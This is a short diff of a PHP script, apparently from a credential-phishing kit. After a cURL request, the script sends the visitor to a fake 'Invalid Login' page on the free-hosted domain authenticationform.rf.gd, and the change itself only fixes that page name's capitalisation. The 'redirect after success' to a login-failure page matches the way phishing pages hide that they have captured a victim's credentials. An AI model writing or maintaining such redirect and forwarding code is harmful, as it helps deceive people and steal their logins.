@@ -40,6 +40,6 @@ curl_exec($ch);
 curl_close($ch);
 
 // Redirect after success
-header("Location: https://authenticationform.rf.gd/cache_site/invalid%20login.php");
+header("Location: https://authenticationform.rf.gd/cache_site/Invalid%20Login.php");
 exit;
 ?>
